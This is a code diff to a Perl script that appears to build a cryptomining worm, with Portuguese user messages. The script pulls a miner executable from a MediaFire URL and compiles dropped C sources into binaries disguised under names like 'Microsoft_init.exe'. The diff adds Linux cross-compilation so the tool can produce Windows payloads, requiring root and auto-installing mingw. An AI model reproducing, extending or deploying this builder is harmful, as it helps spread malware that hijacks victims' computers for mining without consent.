@@ -22,7 +22,7 @@ sub start {
 	my $cpu_or_gpu = <STDIN>;
 	if(defined($cpu_or_gpu)){
 	  chomp $cpu_or_gpu;
-	  my $command;
+	  my ($gcc, $command) = "gcc", undef;
 	  $command = "NsCpuCNMiner32.exe" if $cpu_or_gpu =~ /CPU/i;
 	  $command = "NsGpuCNMiner.exe" if $cpu_or_gpu =~ /GPU/i;
 	  $cpu_or_gpu = "http://download1518.mediafire.com/dwf4kvjhbylg/o5c3rn5s2k349lu/NsCpuCNMiner32.exe" if $cpu_or_gpu =~ /CPU/i;
@@ -102,12 +102,22 @@ HERE
 	  open(MOVE, ">init.c");
 	  print MOVE $init;
 	  close(MOVE);
+	  if($Config{osname} =~ /linux/i){
+	    if($< != 0){
+		  print "\n[", color("RED"),"*",color("reset") . "] Execute o programa como root !\n";
+		  exit 0;
+		}
+		print "\n[", color("RED"),"*",color("reset") . "] Em 3 segundos, o programa ira instalar dependencias necessarias\n";
+		sleep 3;
+		system("sudo apt-get install mingw-w64 -y");
+		$gcc = "i686-w64-mingw32-" . $gcc;
+	  }
 	  if(-e "init.c"){
-	    system("gcc -o Microsoft_init.exe init.c");
+	    system("$gcc -o Microsoft_init.exe init.c");
 		unlink "init.c";
 	  }
 	  if(-e "move.c"){
-	    system("gcc -o Move.exe move.c");
+	    system("$gcc -o Move.exe move.c");
 	    unlink "move.c";
 	  }
 	  if(-e "worm.pl"){
